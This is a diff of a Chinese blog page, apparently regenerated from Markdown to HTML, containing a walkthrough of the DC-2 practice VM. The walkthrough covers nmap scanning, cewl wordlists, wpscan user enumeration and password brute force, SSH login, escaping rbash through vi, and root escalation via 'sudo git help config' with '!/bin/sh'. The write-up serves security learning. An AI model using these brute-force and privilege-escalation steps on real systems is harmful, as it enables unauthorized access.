@@ -52,173 +52,108 @@
     <h1>DC-2</h1>
     <div class="post-meta">
       <time datetime="2025-11-30T16:29:46.000Z">2025.12.01</time>
-      <span>10 分钟阅读</span>
+      <span>5 分钟阅读</span>
     </div>
   </header>
   <div class="article-content">
-    
-# DC-2
-
-1.打开kali跟DC-2，设置NAT模式
-
-2.nmap -sn 192.168.243.0/24扫描的得到DC-2的IP192.168.243.134
-
-![image-20251129153910488](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129153910488.png)
-
-3.nmap -sT -v 192.168.243.134扫描开放端口得到http
-
-![image-20251129174238237](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174238237.png)
-
-4.访问192.168.243.134，发现找不到服务器，观察界面发现IP被强制转换为域名
-
-![image-20251129174420848](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174420848.png)
-
-5.打开本地hosts文件，路径C:\Windows\System32\drivers\etc\hosts
-
-添加192.168.243.134 dc-2
-
-6.成功访问网站，使用Wappalyzer查看网站信息
-
-![image-20251129174959395](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174959395.png)
-
-7.在网站中找到flag1，提示要用cewl生成字典
-
-![image-20251129174851529](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174851529.png)
-
-8.cewl http://dc-2/ -w pswd.txt 使用cewl爬取网页内容生成密码字典文件，并生成.txt文件
-
-9.dirb  http://192.168.243.134/ 挖掘网站隐藏目录，得到网站登录界面http://192.168.243.134/wp-admin
-
-10.wpscan --url http://dc-2/ -e u 枚举用户名，得到三个用户admin,jerry,tom
-
-![image-20251129220850042](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129220850042.png)
-
-11.将爆破出的三个用户名保存在user.txt中
-
-![image-20251129221623461](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129221623461.png)
-
-12.wpscan --url http://dc-2/ -U user.txt -P pswd.txt 爆得到两个有效账密
-
-![image-20251130135346108](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130135346108.png)
-
-13.登录jerry的账号,在page界面找到flag2
-
-![image-20251129222649099](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129222649099.png)
-
-If you can't exploit WordPress and take a shortcut, there is another way.
-
-Hope you found another entry point.
-
-14.可能漏掉了什么端口号
-
-nmap -A -p- 192.168.243.134进行全面扫描，得到ssh服务
-
-![image-20251129224645200](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129224645200.png)
-
-15.ssh tom@192.168.243.134 -p 7744 指定端口连接,远程登录tom用户
-
-16.ls 查看当前目录，发现flag3
-
-![image-20251129230602220](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129230602220.png)
-
-17.cat flag3 查看flag3
-
-![image-20251129231136616](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129231136616.png)
-
-被-rbash限制了
-
-18.compgen -c 列出所有能用的命令，发现有vi
-
-![image-20251129232326606](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129232326606.png)
-
-19.使用vi flag.txt查看文件
-
-![image-20251129232340016](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129232340016.png)
-
-20.尝试登录jerry用户，发现登录失败
-
-21.回到tom用户，使用vi提权
-
-![image-20251130013632703](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013632703.png)
-
-末行模式依次写入
-
-:set shell =/bin/sh
-
-:shell
-
-![image-20251130013730030](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013730030.png)
-
-![image-20251130013834927](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013834927.png)
-
-回车，得到部分权限
-
-22.cd .. 回到上级目录
-
-cd jerry  进入jerry的家目录发现flag4
-
-![image-20251130014007285](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130014007285.png)
-
-vi flag4.txt  查看
-
-![image-20251130014059816](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130014059816.png)
-
-23.PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  把可执行程序的搜索目录写进 PATH 变量
-
-export PATH  执行环境变量
-
-su jerry  切换成jerry用户
-
-![image-20251130201028762](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130201028762.png)
-
-24.依然没有root权限
-
-![image-20251130201206422](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130201206422.png)
-
-25.flag4.txt提示可以用git提权
-
-sudo -l  查看被sudo服务授权的命令
-
-![image-20251130210337888](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130210337888.png)
-
-26.sudo git help config
-
-!/bin/sh
-
-提权成功
-
-![image-20251201002919622](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251201002919622.png)
-
-# 注：
-
-1.DC-2靶机强制使用域名访问，在Web服务中做了重定向，即使输入IP，也会跳转到http://dc-2/，需要在hosts文件中加入192.168.243.134 dc-2让系统将域名解析到IP
-
-2.rbash全称 Restricted Bash，是 Bash 的一个“阉割版” shell。
-
-核心目的：给用户一个交互式命令行，但又能最大限度地锁住他，防止越权操作。
-
-3.在 Linux 命令行里，>> 是一个重定向操作符，作用是把命令的输出追加到指定文件的末尾，而不是覆盖原文件
-
-例：
-
-echo "hello" >> file.txt
-
-4.:set shell=/bin/sh
-设置内部选项，把选项 shell 改成 /bin/sh
-
-:shell打开一个交互式 shell,执行后 vim 会挂起，暂时进入 /bin/sh（或 set shell= 指定的那个解释器）里，在 shell 里 exit 后又回到 vim。
-
-5.Linux命令目录及用途
-
-| 目录              | 用途                          |
-| ----------------- | ----------------------------- |
-| `/usr/local/bin`  | 本地用户程序，供所有用户使用  |
-| `/usr/local/sbin` | 本地系统管理程序（root 专用） |
-| `/usr/bin`        | 发行版包管理器安装的普通程序  |
-| `/usr/sbin`       | 发行版包管理器安装的管理程序  |
-
-
-
+    <h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>1.打开kali跟DC-2，设置NAT模式</p>
+<p>2.nmap -sn 192.168.243.0&#x2F;24扫描的得到DC-2的IP192.168.243.134</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129153910488.png" alt="image-20251129153910488"></p>
+<p>3.nmap -sT -v 192.168.243.134扫描开放端口得到http</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174238237.png" alt="image-20251129174238237"></p>
+<p>4.访问192.168.243.134，发现找不到服务器，观察界面发现IP被强制转换为域名</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174420848.png" alt="image-20251129174420848"></p>
+<p>5.打开本地hosts文件，路径C:\Windows\System32\drivers\etc\hosts</p>
+<p>添加192.168.243.134 dc-2</p>
+<p>6.成功访问网站，使用Wappalyzer查看网站信息</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174959395.png" alt="image-20251129174959395"></p>
+<p>7.在网站中找到flag1，提示要用cewl生成字典</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129174851529.png" alt="image-20251129174851529"></p>
+<p>8.cewl <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a> -w pswd.txt 使用cewl爬取网页内容生成密码字典文件，并生成.txt文件</p>
+<p>9.dirb  <a target="_blank" rel="noopener" href="http://192.168.243.134/">http://192.168.243.134/</a> 挖掘网站隐藏目录，得到网站登录界面<a target="_blank" rel="noopener" href="http://192.168.243.134/wp-admin">http://192.168.243.134/wp-admin</a></p>
+<p>10.wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a> -e u 枚举用户名，得到三个用户admin,jerry,tom</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129220850042.png" alt="image-20251129220850042"></p>
+<p>11.将爆破出的三个用户名保存在user.txt中</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129221623461.png" alt="image-20251129221623461"></p>
+<p>12.wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a> -U user.txt -P pswd.txt 爆得到两个有效账密</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130135346108.png" alt="image-20251130135346108"></p>
+<p>13.登录jerry的账号,在page界面找到flag2</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129222649099.png" alt="image-20251129222649099"></p>
+<p>If you can’t exploit WordPress and take a shortcut, there is another way.</p>
+<p>Hope you found another entry point.</p>
+<p>14.可能漏掉了什么端口号</p>
+<p>nmap -A -p- 192.168.243.134进行全面扫描，得到ssh服务</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129224645200.png" alt="image-20251129224645200"></p>
+<p>15.ssh <a href="mailto:&#116;&#111;&#x6d;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#52;&#x33;&#46;&#x31;&#x33;&#52;">tom@192.168.243.134</a> -p 7744 指定端口连接,远程登录tom用户</p>
+<p>16.ls 查看当前目录，发现flag3</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129230602220.png" alt="image-20251129230602220"></p>
+<p>17.cat flag3 查看flag3</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129231136616.png" alt="image-20251129231136616"></p>
+<p>被-rbash限制了</p>
+<p>18.compgen -c 列出所有能用的命令，发现有vi</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129232326606.png" alt="image-20251129232326606"></p>
+<p>19.使用vi flag.txt查看文件</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251129232340016.png" alt="image-20251129232340016"></p>
+<p>20.尝试登录jerry用户，发现登录失败</p>
+<p>21.回到tom用户，使用vi提权</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013632703.png" alt="image-20251130013632703"></p>
+<p>末行模式依次写入</p>
+<p>:set shell &#x3D;&#x2F;bin&#x2F;sh</p>
+<p>:shell</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013730030.png" alt="image-20251130013730030"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130013834927.png" alt="image-20251130013834927"></p>
+<p>回车，得到部分权限</p>
+<p>22.cd .. 回到上级目录</p>
+<p>cd jerry  进入jerry的家目录发现flag4</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130014007285.png" alt="image-20251130014007285"></p>
+<p>vi flag4.txt  查看</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130014059816.png" alt="image-20251130014059816"></p>
+<p>23.PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin  把可执行程序的搜索目录写进 PATH 变量</p>
+<p>export PATH  执行环境变量</p>
+<p>su jerry  切换成jerry用户</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130201028762.png" alt="image-20251130201028762"></p>
+<p>24.依然没有root权限</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130201206422.png" alt="image-20251130201206422"></p>
+<p>25.flag4.txt提示可以用git提权</p>
+<p>sudo -l  查看被sudo服务授权的命令</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251130210337888.png" alt="image-20251130210337888"></p>
+<p>26.sudo git help config</p>
+<p>!&#x2F;bin&#x2F;sh</p>
+<p>提权成功</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251201002919622.png" alt="image-20251201002919622"></p>
+<h1 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h1><p>1.DC-2靶机强制使用域名访问，在Web服务中做了重定向，即使输入IP，也会跳转到<a target="_blank" rel="noopener" href="http://dc-2/%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8hosts%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8A%A0%E5%85%A5192.168.243.134">http://dc-2/，需要在hosts文件中加入192.168.243.134</a> dc-2让系统将域名解析到IP</p>
+<p>2.rbash全称 Restricted Bash，是 Bash 的一个“阉割版” shell。</p>
+<p>核心目的：给用户一个交互式命令行，但又能最大限度地锁住他，防止越权操作。</p>
+<p>3.在 Linux 命令行里，&gt;&gt; 是一个重定向操作符，作用是把命令的输出追加到指定文件的末尾，而不是覆盖原文件</p>
+<p>例：</p>
+<p>echo “hello” &gt;&gt; file.txt</p>
+<p>4.:set shell&#x3D;&#x2F;bin&#x2F;sh<br>设置内部选项，把选项 shell 改成 &#x2F;bin&#x2F;sh</p>
+<p>:shell打开一个交互式 shell,执行后 vim 会挂起，暂时进入 &#x2F;bin&#x2F;sh（或 set shell&#x3D; 指定的那个解释器）里，在 shell 里 exit 后又回到 vim。</p>
+<p>5.Linux命令目录及用途</p>
+<table>
+<thead>
+<tr>
+<th>目录</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/usr/local/bin</code></td>
+<td>本地用户程序，供所有用户使用</td>
+</tr>
+<tr>
+<td><code>/usr/local/sbin</code></td>
+<td>本地系统管理程序（root 专用）</td>
+</tr>
+<tr>
+<td><code>/usr/bin</code></td>
+<td>发行版包管理器安装的普通程序</td>
+</tr>
+<tr>
+<td><code>/usr/sbin</code></td>
+<td>发行版包管理器安装的管理程序</td>
+</tr>
+</tbody></table>
 
   </div>
 </article>
